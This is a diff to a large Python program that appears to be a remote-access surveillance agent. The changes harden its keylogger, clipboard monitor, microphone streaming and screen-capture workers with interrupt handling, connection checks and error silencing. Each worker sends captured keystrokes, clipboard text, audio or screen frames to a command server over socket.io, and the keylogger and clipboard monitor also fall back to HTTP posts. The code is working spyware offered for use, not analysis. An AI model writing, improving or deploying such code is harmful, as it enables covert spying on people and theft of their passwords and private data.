@@ -5171,6 +5171,8 @@ def audio_capture_worker(agent_id):
         log_message("Error: Audio capture queue not initialized", "error")
         return
     
+    p = None
+    stream = None
     try:
         p = pyaudio.PyAudio()
         
@@ -5213,17 +5215,24 @@ def audio_capture_worker(agent_id):
                         pass
                 
                 time.sleep(0.02)  # 20ms for 50 FPS
+            except KeyboardInterrupt:
+                log_message("Audio capture worker interrupted")
+                break
             except Exception as e:
                 log_message(f"Audio capture error: {e}")
                 break
         
-        stream.stop_stream()
-        stream.close()
-        p.terminate()
-        log_message("Audio capture stopped")
-        
+    except KeyboardInterrupt:
+        log_message("Audio capture worker interrupted")
     except Exception as e:
         log_message(f"Audio capture initialization error: {e}")
+    finally:
+        if stream:
+            stream.stop_stream()
+            stream.close()
+        if p:
+            p.terminate()
+        log_message("Audio capture stopped")
 
 def audio_encode_worker(agent_id):
     """Encode audio frames from capture queue to Opus and put in encode queue."""
@@ -5246,43 +5255,49 @@ def audio_encode_worker(agent_id):
         log_message(f"Error initializing Opus encoder: {e}")
         encoder = None
     
-    while AUDIO_STREAMING_ENABLED:
-        try:
-            # Get audio data from capture queue
+    try:
+        while AUDIO_STREAMING_ENABLED:
             try:
-                pcm_data = audio_capture_queue.get(timeout=0.1)
-            except queue.Empty:
-                continue
-            
-            # Encode with Opus if available, otherwise use PCM
-            if encoder:
+                # Get audio data from capture queue
                 try:
-                    # Convert PCM to Opus
-                    if not NUMPY_AVAILABLE:
-                        log_message("NumPy not available for audio processing", "warning")
-                        encoded_data = pcm_data  # Fallback to PCM
-                        continue
-                    pcm_array = np.frombuffer(pcm_data, dtype=np.int16)
-                    encoded_data = encoder.encode(pcm_array.tobytes(), CHUNK)
-                except Exception as e:
-                    log_message(f"Opus encoding error: {e}")
-                    encoded_data = pcm_data  # Fallback to PCM
-            else:
-                encoded_data = pcm_data  # Use PCM
-            
-            # Put in encode queue, drop oldest if full
-            try:
-                audio_encode_queue.put_nowait(encoded_data)
-            except queue.Full:
-                try:
-                    audio_encode_queue.get_nowait()  # Remove oldest
-                    audio_encode_queue.put_nowait(encoded_data)  # Add new
+                    pcm_data = audio_capture_queue.get(timeout=0.5)
                 except queue.Empty:
-                    pass
-                    
-        except Exception as e:
-            log_message(f"Audio encoding error: {e}")
-            time.sleep(0.01)
+                    continue
+                
+                # Encode with Opus if available, otherwise use PCM
+                if encoder:
+                    try:
+                        # Convert PCM to Opus
+                        if not NUMPY_AVAILABLE:
+                            log_message("NumPy not available for audio processing", "warning")
+                            encoded_data = pcm_data  # Fallback to PCM
+                            continue
+                        pcm_array = np.frombuffer(pcm_data, dtype=np.int16)
+                        encoded_data = encoder.encode(pcm_array.tobytes(), CHUNK)
+                    except Exception as e:
+                        log_message(f"Opus encoding error: {e}")
+                        encoded_data = pcm_data  # Fallback to PCM
+                else:
+                    encoded_data = pcm_data  # Use PCM
+                
+                # Put in encode queue, drop oldest if full
+                try:
+                    audio_encode_queue.put_nowait(encoded_data)
+                except queue.Full:
+                    try:
+                        audio_encode_queue.get_nowait()  # Remove oldest
+                        audio_encode_queue.put_nowait(encoded_data)  # Add new
+                    except queue.Empty:
+                        pass
+                        
+            except KeyboardInterrupt:
+                log_message("Audio encode worker interrupted")
+                break
+            except Exception as e:
+                log_message(f"Audio encoding error: {e}")
+                time.sleep(0.1)
+    except KeyboardInterrupt:
+        log_message("Audio encode worker interrupted")
     
     log_message("Audio encoding stopped")
 
@@ -5298,27 +5313,49 @@ def audio_send_worker(agent_id):
         log_message("Error: Audio encode queue not initialized", "error")
         return
     
-    while AUDIO_STREAMING_ENABLED:
-        try:
-            # Get encoded data from encode queue
+    # Track last log time to avoid spam
+    last_disconnect_log_time = 0.0
+    
+    try:
+        while AUDIO_STREAMING_ENABLED:
             try:
-                encoded_data = audio_encode_queue.get(timeout=0.1)
-            except queue.Empty:
-                continue
-            
-            # Send via socket.io (binary data is automatically detected)
-            try:
-                sio.emit('audio_frame', {
-                    'agent_id': agent_id,
-                    'frame': encoded_data
-                })
-            except Exception as e:
-                log_message(f"Audio send error: {e}")
-                time.sleep(0.01)
+                # Get encoded data from encode queue
+                try:
+                    encoded_data = audio_encode_queue.get(timeout=0.5)
+                except queue.Empty:
+                    continue
                 
-        except Exception as e:
-            log_message(f"Audio sending error: {e}")
-            time.sleep(0.01)
+                # Check if socket is connected before sending
+                if not sio.connected:
+                    # Throttle disconnect log messages
+                    now = time.time()
+                    if now >= last_disconnect_log_time + 5.0:
+                        log_message("Socket.IO disconnected, deferring audio frames", "warning")
+                        last_disconnect_log_time = now
+                    time.sleep(0.5)
+                    continue
+                
+                # Send via socket.io (binary data is automatically detected)
+                try:
+                    sio.emit('audio_frame', {
+                        'agent_id': agent_id,
+                        'frame': encoded_data
+                    })
+                except Exception as e:
+                    error_msg = str(e)
+                    # Silence "not a connected namespace" errors
+                    if "not a connected namespace" not in error_msg and "Connection is closed" not in error_msg:
+                        log_message(f"Audio send error: {e}")
+                    time.sleep(0.1)
+                    
+            except KeyboardInterrupt:
+                log_message("Audio send worker interrupted")
+                break
+            except Exception as e:
+                log_message(f"Audio sending error: {e}")
+                time.sleep(0.1)
+    except KeyboardInterrupt:
+        log_message("Audio send worker interrupted")
     
     log_message("Audio sending stopped")
 
@@ -7029,45 +7066,56 @@ def keylogger_worker(agent_id):
     """Keylogger worker thread that sends data periodically."""
     global KEYLOGGER_ENABLED, KEYLOG_BUFFER
     
-    while KEYLOGGER_ENABLED:
-        try:
-            if KEYLOG_BUFFER:
-                # Send accumulated keylog data
-                data_to_send = KEYLOG_BUFFER.copy()
-                KEYLOG_BUFFER = []
-                
-                # Use socket.io for better performance and consistency
-                try:
-                    if sio and sio.connected:
-                        for entry in data_to_send:
-                            sio.emit('keylog_data', {
-                                'agent_id': agent_id,
-                                'data': entry
-                            })
-                    else:
-                        log_message("Socket.io not connected, buffering keylog data", "warning")
-                        # Re-add data to buffer if connection is down
-                        KEYLOG_BUFFER.extend(data_to_send)
-                except Exception as e:
-                    log_message(f"Keylogger socket.io error: {e}")
-                    # Fallback to HTTP if socket.io fails
-                    if REQUESTS_AVAILABLE:
-                        try:
-                            url = f"{SERVER_URL}/keylog_data/{agent_id}"
+    try:
+        while KEYLOGGER_ENABLED:
+            try:
+                if KEYLOG_BUFFER:
+                    # Send accumulated keylog data
+                    data_to_send = KEYLOG_BUFFER.copy()
+                    KEYLOG_BUFFER = []
+                    
+                    # Use socket.io for better performance and consistency
+                    try:
+                        if sio and sio.connected:
                             for entry in data_to_send:
-                                requests.post(url, json={"data": entry}, timeout=5)
-                        except Exception as http_e:
-                            log_message(f"Keylogger HTTP fallback error: {http_e}")
-                            # Re-add data to buffer for next attempt
+                                sio.emit('keylog_data', {
+                                    'agent_id': agent_id,
+                                    'data': entry
+                                })
+                        else:
+                            log_message("Socket.io not connected, buffering keylog data", "warning")
+                            # Re-add data to buffer if connection is down
                             KEYLOG_BUFFER.extend(data_to_send)
-                    else:
-                        log_message("HTTP fallback not available, re-buffering keylog data", "warning")
-                        KEYLOG_BUFFER.extend(data_to_send)
-            
-            time.sleep(5)  # Send data every 5 seconds
-        except Exception as e:
-            log_message(f"Keylogger worker error: {e}")
-            time.sleep(5)
+                    except Exception as e:
+                        error_msg = str(e)
+                        # Silence connection errors
+                        if "not a connected namespace" not in error_msg and "Connection is closed" not in error_msg:
+                            log_message(f"Keylogger socket.io error: {e}")
+                        # Fallback to HTTP if socket.io fails
+                        if REQUESTS_AVAILABLE:
+                            try:
+                                url = f"{SERVER_URL}/keylog_data/{agent_id}"
+                                for entry in data_to_send:
+                                    requests.post(url, json={"data": entry}, timeout=5)
+                            except Exception as http_e:
+                                log_message(f"Keylogger HTTP fallback error: {http_e}")
+                                # Re-add data to buffer for next attempt
+                                KEYLOG_BUFFER.extend(data_to_send)
+                        else:
+                            log_message("HTTP fallback not available, re-buffering keylog data", "warning")
+                            KEYLOG_BUFFER.extend(data_to_send)
+                
+                time.sleep(5)  # Send data every 5 seconds
+            except KeyboardInterrupt:
+                log_message("Keylogger worker interrupted")
+                break
+            except Exception as e:
+                log_message(f"Keylogger worker error: {e}")
+                time.sleep(5)
+    except KeyboardInterrupt:
+        log_message("Keylogger worker interrupted")
+    
+    log_message("Keylogger worker stopped")
 
 def start_keylogger(agent_id):
     """Start the keylogger."""
@@ -7138,40 +7186,51 @@ def clipboard_monitor_worker(agent_id):
     """Clipboard monitor worker thread."""
     global CLIPBOARD_MONITOR_ENABLED, LAST_CLIPBOARD_CONTENT
     
-    while CLIPBOARD_MONITOR_ENABLED:
-        try:
-            current_content = get_clipboard_content()
-            if current_content and current_content != LAST_CLIPBOARD_CONTENT:
-                timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
-                clipboard_entry = f"{timestamp}: {current_content[:500]}{'...' if len(current_content) > 500 else ''}"
-                
-                # Use socket.io for better performance and consistency
-                try:
-                    if sio and sio.connected:
-                        sio.emit('clipboard_data', {
-                            'agent_id': agent_id,
-                            'data': clipboard_entry
-                        })
-                        LAST_CLIPBOARD_CONTENT = current_content
-                    else:
-                        log_message("Socket.io not connected for clipboard data", "warning")
-                except Exception as e:
-                    log_message(f"Clipboard socket.io error: {e}")
-                    # Fallback to HTTP if socket.io fails
-                    if REQUESTS_AVAILABLE:
-                        try:
-                            url = f"{SERVER_URL}/clipboard_data/{agent_id}"
-                            requests.post(url, json={"data": clipboard_entry}, timeout=5)
+    try:
+        while CLIPBOARD_MONITOR_ENABLED:
+            try:
+                current_content = get_clipboard_content()
+                if current_content and current_content != LAST_CLIPBOARD_CONTENT:
+                    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
+                    clipboard_entry = f"{timestamp}: {current_content[:500]}{'...' if len(current_content) > 500 else ''}"
+                    
+                    # Use socket.io for better performance and consistency
+                    try:
+                        if sio and sio.connected:
+                            sio.emit('clipboard_data', {
+                                'agent_id': agent_id,
+                                'data': clipboard_entry
+                            })
                             LAST_CLIPBOARD_CONTENT = current_content
-                        except Exception as http_e:
-                            log_message(f"Clipboard HTTP fallback error: {http_e}")
-                    else:
-                        log_message("HTTP fallback not available for clipboard data", "warning")
-            
-            time.sleep(2)  # Check clipboard every 2 seconds
-        except Exception as e:
-            log_message(f"Clipboard monitor worker error: {e}")
-            time.sleep(2)
+                        else:
+                            log_message("Socket.io not connected for clipboard data", "warning")
+                    except Exception as e:
+                        error_msg = str(e)
+                        # Silence connection errors
+                        if "not a connected namespace" not in error_msg and "Connection is closed" not in error_msg:
+                            log_message(f"Clipboard socket.io error: {e}")
+                        # Fallback to HTTP if socket.io fails
+                        if REQUESTS_AVAILABLE:
+                            try:
+                                url = f"{SERVER_URL}/clipboard_data/{agent_id}"
+                                requests.post(url, json={"data": clipboard_entry}, timeout=5)
+                                LAST_CLIPBOARD_CONTENT = current_content
+                            except Exception as http_e:
+                                log_message(f"Clipboard HTTP fallback error: {http_e}")
+                        else:
+                            log_message("HTTP fallback not available for clipboard data", "warning")
+                
+                time.sleep(2)  # Check clipboard every 2 seconds
+            except KeyboardInterrupt:
+                log_message("Clipboard monitor worker interrupted")
+                break
+            except Exception as e:
+                log_message(f"Clipboard monitor worker error: {e}")
+                time.sleep(2)
+    except KeyboardInterrupt:
+        log_message("Clipboard monitor worker interrupted")
+    
+    log_message("Clipboard monitor worker stopped")
 
 def start_clipboard_monitor(agent_id):
     """Start clipboard monitoring."""
@@ -10376,14 +10435,29 @@ def connect():
     try:
         import psutil
         def _telemetry_loop():
-            while True:
-                try:
-                    cpu = psutil.cpu_percent(interval=1)
-                    mem = psutil.virtual_memory().percent
-                    net = 0
-                    sio.emit('agent_telemetry', {'agent_id': agent_id, 'cpu': cpu, 'memory': mem, 'network': net})
-                except Exception:
-                    pass
+            try:
+                while sio and sio.connected:
+                    try:
+                        cpu = psutil.cpu_percent(interval=1)
+                        mem = psutil.virtual_memory().percent
+                        net = 0
+                        if sio.connected:
+                            sio.emit('agent_telemetry', {'agent_id': agent_id, 'cpu': cpu, 'memory': mem, 'network': net})
+                        else:
+                            time.sleep(5)
+                    except KeyboardInterrupt:
+                        log_message("Telemetry worker interrupted")
+                        break
+                    except Exception as e:
+                        error_msg = str(e)
+                        # Silence connection errors
+                        if "not a connected namespace" not in error_msg and "Connection is closed" not in error_msg:
+                            log_message(f"Telemetry error: {e}", "warning")
+                        time.sleep(5)
+                        break
+            except KeyboardInterrupt:
+                log_message("Telemetry worker interrupted")
+            log_message("Telemetry worker stopped")
         threading.Thread(target=_telemetry_loop, daemon=True).start()
     except Exception:
         pass
@@ -11579,9 +11653,12 @@ def agent_main():
                     log_message("Socket.IO not available - running in offline mode", "warning")
                     # Continue running in offline mode
                     log_message("Agent running in offline mode - no server communication")
-                    while True:
-                        time.sleep(60)  # Keep alive in offline mode
-                        # Could implement local functionality here
+                    try:
+                        while True:
+                            time.sleep(60)  # Keep alive in offline mode
+                            # Could implement local functionality here
+                    except KeyboardInterrupt:
+                        log_message("Offline mode interrupted")
                     return
                 
                 # Add connection timeout and better error handling
@@ -11650,12 +11727,24 @@ def agent_main():
                 
                 # Start heartbeat to keep agent visible
                 def heartbeat_worker():
-                    while sio.connected:
-                        try:
-                            sio.emit('agent_heartbeat', {'agent_id': agent_id, 'timestamp': time.time()})
-                            time.sleep(30)  # Send heartbeat every 30 seconds
-                        except Exception:
-                            break
+                    try:
+                        while sio and sio.connected:
+                            try:
+                                sio.emit('agent_heartbeat', {'agent_id': agent_id, 'timestamp': time.time()})
+                                time.sleep(30)  # Send heartbeat every 30 seconds
+                            except KeyboardInterrupt:
+                                log_message("Heartbeat worker interrupted")
+                                break
+                            except Exception as e:
+                                error_msg = str(e)
+                                # Silence connection errors
+                                if "not a connected namespace" not in error_msg and "Connection is closed" not in error_msg:
+                                    log_message(f"Heartbeat error: {e}", "warning")
+                                time.sleep(5)
+                                break
+                    except KeyboardInterrupt:
+                        log_message("Heartbeat worker interrupted")
+                    log_message("Heartbeat worker stopped")
                 
                 heartbeat_thread = threading.Thread(target=heartbeat_worker, daemon=True)
                 heartbeat_thread.start()
@@ -11731,9 +11820,10 @@ def signal_handler(signum, frame):
             log_message(f"Error stopping low latency input: {e}")
         
         # Disconnect from server
-        if SOCKETIO_AVAILABLE and 'sio' in globals() and sio.connected:
+        if SOCKETIO_AVAILABLE and 'sio' in globals() and sio is not None:
             try:
-                sio.disconnect()
+                if sio.connected:
+                    sio.disconnect()
             except Exception as e:
                 log_message(f"Error disconnecting from server: {e}")
         
@@ -11858,8 +11948,11 @@ if __name__ == "__main__":
         import traceback
         traceback.print_exc()
         # Continue running with basic functionality
-        while True:
-            time.sleep(60)
+        try:
+            while True:
+                time.sleep(60)
+        except KeyboardInterrupt:
+            print("Fallback mode interrupted")
     except Exception as e:
         print(f"System error: {e}")
         print("Full traceback:")
@@ -11903,77 +11996,128 @@ def screen_capture_worker(agent_id):
     if not MSS_AVAILABLE or not NUMPY_AVAILABLE or not CV2_AVAILABLE:
         log_message("Required modules not available for screen capture", "error")
         return
-    with mss.mss() as sct:
-        monitors = sct.monitors
-        monitor_index = 1 if len(monitors) > 1 else 0
-        monitor = monitors[monitor_index]
-        # mss returns monitor dicts with left/top/right/bottom; newer may include width/height
-        if isinstance(monitor, dict):
-            width = int(monitor.get('width', (monitor['right'] - monitor['left'])))
-            height = int(monitor.get('height', (monitor['bottom'] - monitor['top'])))
-        else:
-            # fallback tuple-style indexing
-            width = monitor[2] - monitor[0]
-            height = monitor[3] - monitor[1]
-        if width > 1280:
-            scale = 1280 / width
-            width = int(width * scale)
-            height = int(height * scale)
-        frame_time = 1.0 / TARGET_FPS
-        while STREAMING_ENABLED:
-            start = time.time()
-            sct_img = sct.grab(monitor if isinstance(monitor, dict) else monitors[monitor_index])
-            img = np.array(sct_img)
-            if img.shape[1] != width or img.shape[0] != height:
-                img = cv2.resize(img, (width, height), interpolation=cv2.INTER_AREA)
-            if img.shape[2] == 4:
-                img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
-            # Non-blocking put, drop oldest if full
+    try:
+        with mss.mss() as sct:
+            monitors = sct.monitors
+            monitor_index = 1 if len(monitors) > 1 else 0
+            monitor = monitors[monitor_index]
+            # mss returns monitor dicts with left/top/right/bottom; newer may include width/height
+            if isinstance(monitor, dict):
+                width = int(monitor.get('width', (monitor['right'] - monitor['left'])))
+                height = int(monitor.get('height', (monitor['bottom'] - monitor['top'])))
+            else:
+                # fallback tuple-style indexing
+                width = monitor[2] - monitor[0]
+                height = monitor[3] - monitor[1]
+            if width > 1280:
+                scale = 1280 / width
+                width = int(width * scale)
+                height = int(height * scale)
+            frame_time = 1.0 / TARGET_FPS
+            
             try:
-                if capture_queue.full():
-                    capture_queue.get_nowait()
-                capture_queue.put_nowait(img)
-            except queue.Full:
-                pass
-            elapsed = time.time() - start
-            sleep_time = max(0, frame_time - elapsed)
-            if sleep_time > 0:
-                time.sleep(sleep_time)
+                while STREAMING_ENABLED:
+                    try:
+                        start = time.time()
+                        sct_img = sct.grab(monitor if isinstance(monitor, dict) else monitors[monitor_index])
+                        img = np.array(sct_img)
+                        if img.shape[1] != width or img.shape[0] != height:
+                            img = cv2.resize(img, (width, height), interpolation=cv2.INTER_AREA)
+                        if img.shape[2] == 4:
+                            img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
+                        # Non-blocking put, drop oldest if full
+                        try:
+                            if capture_queue.full():
+                                capture_queue.get_nowait()
+                            capture_queue.put_nowait(img)
+                        except queue.Full:
+                            pass
+                        elapsed = time.time() - start
+                        sleep_time = max(0, frame_time - elapsed)
+                        if sleep_time > 0:
+                            time.sleep(sleep_time)
+                    except KeyboardInterrupt:
+                        log_message("Screen capture worker interrupted")
+                        break
+            except KeyboardInterrupt:
+                log_message("Screen capture worker interrupted")
+    except KeyboardInterrupt:
+        log_message("Screen capture worker interrupted")
+    
+    log_message("Screen capture stopped")
 
 def screen_encode_worker(agent_id):
     global STREAMING_ENABLED, capture_queue, encode_queue
     if not CV2_AVAILABLE:
         log_message("OpenCV not available for screen encoding", "error")
         return
-    while STREAMING_ENABLED:
-        try:
-            img = capture_queue.get(timeout=0.5)
-        except queue.Empty:
-            continue
-        # H.264 encode (for now, JPEG fallback)
-        is_success, encoded = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, 80])
-        if is_success:
+    
+    try:
+        while STREAMING_ENABLED:
             try:
-                if encode_queue.full():
-                    encode_queue.get_nowait()
-                encode_queue.put_nowait(encoded.tobytes())
-            except queue.Full:
-                pass
+                try:
+                    img = capture_queue.get(timeout=0.5)
+                except queue.Empty:
+                    continue
+                # H.264 encode (for now, JPEG fallback)
+                is_success, encoded = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, 80])
+                if is_success:
+                    try:
+                        if encode_queue.full():
+                            encode_queue.get_nowait()
+                        encode_queue.put_nowait(encoded.tobytes())
+                    except queue.Full:
+                        pass
+            except KeyboardInterrupt:
+                log_message("Screen encode worker interrupted")
+                break
+    except KeyboardInterrupt:
+        log_message("Screen encode worker interrupted")
+    
+    log_message("Screen encoding stopped")
 
 def screen_send_worker(agent_id):
     global STREAMING_ENABLED, encode_queue, sio
-    while STREAMING_ENABLED:
-        try:
-            frame = encode_queue.get(timeout=0.5)
-        except queue.Empty:
-            continue
-        try:
-            # Encode frame as base64 data URL for browser display
-            frame_b64 = base64.b64encode(frame).decode('utf-8')
-            frame_data_url = f'data:image/jpeg;base64,{frame_b64}'
-            sio.emit('screen_frame', {'agent_id': agent_id, 'frame': frame_data_url})
-        except Exception as e:
-            log_message(f"SocketIO send error: {e}", "error")
+    
+    # Track last log time to avoid spam
+    last_disconnect_log_time = 0.0
+    
+    try:
+        while STREAMING_ENABLED:
+            try:
+                try:
+                    frame = encode_queue.get(timeout=0.5)
+                except queue.Empty:
+                    continue
+                
+                # Check if socket is connected before sending
+                if not sio.connected:
+                    # Throttle disconnect log messages
+                    now = time.time()
+                    if now >= last_disconnect_log_time + 5.0:
+                        log_message("Socket.IO disconnected, deferring screen frames", "warning")
+                        last_disconnect_log_time = now
+                    time.sleep(0.5)
+                    continue
+                
+                try:
+                    # Encode frame as base64 data URL for browser display
+                    frame_b64 = base64.b64encode(frame).decode('utf-8')
+                    frame_data_url = f'data:image/jpeg;base64,{frame_b64}'
+                    sio.emit('screen_frame', {'agent_id': agent_id, 'frame': frame_data_url})
+                except Exception as e:
+                    error_msg = str(e)
+                    # Silence "not a connected namespace" errors
+                    if "not a connected namespace" not in error_msg and "Connection is closed" not in error_msg:
+                        log_message(f"SocketIO send error: {e}", "error")
+                    time.sleep(0.1)
+            except KeyboardInterrupt:
+                log_message("Screen send worker interrupted")
+                break
+    except KeyboardInterrupt:
+        log_message("Screen send worker interrupted")
+    
+    log_message("Screen send stopped")
 
 # ✅ NOW DEFINE stream_screen_h264_socketio AFTER worker functions exist
 def stream_screen_h264_socketio(agent_id):
